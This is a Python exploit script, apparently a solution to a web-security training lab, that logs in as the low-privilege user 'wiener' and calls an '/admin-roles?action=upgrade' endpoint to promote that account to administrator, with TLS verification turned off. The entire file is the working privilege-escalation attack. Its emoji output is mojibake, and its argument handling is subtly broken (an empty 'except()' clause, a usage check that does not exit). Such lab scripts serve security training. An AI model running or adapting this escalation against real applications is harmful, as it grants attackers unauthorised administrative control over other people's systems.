import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  

def promote_to_admin(session , url):
    print("\n(üëÄ) Attempting to login Wiener Account ..\n")
    login_url = url+"/login"
    login_data = {
        "username":"wiener",
        "password":"peter"
    }
    response = session.post(url=login_url , data=login_data , verify=False)
    res = response.text
    if "Log out" in res:
        print("(üòé) Login Successfully ..\n")
       
        print("(‚ò†Ô∏è) Promting Wiener to Admin ..\n")
        admin_url = url+"/admin-roles?username=wiener&action=upgrade"

        response = session.get(url=admin_url , verify=False)
        res = response.text
        if "Admin panel" in res:
            print("(‚úÖ) Successfully Promoted user to Administrator.. \n")
        else:
            print("(ü•π) Failed to Promote user ...")

def main():
    try:

        if len(sys.argv) != 2:
            print("(+) Usage: %s <url>"% sys.argv[0])
            print("(+) Example: %s www.example.com"% sys.argv[0])
        url = sys.argv[1]
    except():
        print("(-) Missing args")
    session = requests.Session()
    try:

        print("Validating the Target ..")
        response = session.get(url)
        if response.status_code ==200:
            print("(+) Target is Reachable ")
        else:
            print("(-) Target is Unreachable")
            sys.exit(-1)
    except(requests.exceptions.ConnectTimeout):
        print("Connection Timeout ...")
    promote_to_admin(session , url)

if __name__ == "__main__":
    main()